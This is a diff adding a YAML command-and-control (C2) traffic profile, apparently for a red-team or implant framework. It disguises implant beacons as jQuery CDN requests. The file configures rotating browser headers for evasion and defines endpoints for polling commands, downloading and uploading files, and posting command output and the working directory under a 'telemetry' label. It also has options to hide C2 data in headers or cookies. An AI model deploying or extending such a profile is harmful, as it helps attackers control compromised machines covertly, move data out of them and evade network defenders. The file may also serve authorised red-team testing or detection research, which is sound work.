@@ -1,0 +1,74 @@
+# Malleable C2 Profile - jQuery CDN Style
+# Mimics traffic to cdnjs.cloudflare.com/ajax/libs/jquery/
+
+profile:
+  name: "jquery_cdn"
+  description: "Mimics jQuery CDN requests"
+
+# HTTP request shaping
+http:
+  # Command request (client polling for commands)
+  request:
+    uri_pattern: "/ajax/libs/jquery/3.7.1/jquery.min.js"
+    uri_random_suffix: true  # Append random string: /jquery.min.js?v=abc123
+    method: GET
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+      Accept: "application/javascript, text/javascript, */*; q=0.01"
+      Accept-Language: "en-US,en;q=0.9"
+      Accept-Encoding: "gzip, deflate"
+      Referer: "https://www.google.com/"
+      Origin: "https://cdnjs.com"
+    user_agent_rotation:
+      enabled: true
+      list:
+        - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        - "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
+        - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        - "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    accept_language_rotation:
+      enabled: true
+      list: ["en-US,en;q=0.9", "en-GB,en;q=0.9", "en-US,en;q=0.8,en-GB;q=0.7"]
+    referer_rotation:
+      enabled: true
+      list: ["https://www.google.com/", "https://www.bing.com/", "https://www.duckduckgo.com/"]
+
+  # File download request
+  file_request:
+    uri_pattern: "/ajax/libs/jquery/3.7.1/jquery.js"
+    uri_random_suffix: true
+    method: GET
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      Accept: "*/*"
+
+  # File upload
+  file_upload:
+    uri_pattern: "/api/v1/upload"
+    method: PUT
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      Content-Type: "application/octet-stream"
+
+  # Command output response
+  response:
+    uri_pattern: "/api/v1/telemetry"
+    method: POST
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      Content-Type: "application/x-www-form-urlencoded"
+    post_key: "data"
+
+  # CWD response
+  cwd_response:
+    uri_pattern: "/api/v1/cwd"
+    method: POST
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      Content-Type: "application/x-www-form-urlencoded"
+    post_key: "cwd"
+
+# Data hiding (embed C2 data in legitimate-looking fields)
+data:
+  hide_in_headers: false  # If true, hide data in custom headers instead of URL/body
+  hide_in_cookies: false  # If true, hide data in Cookie header
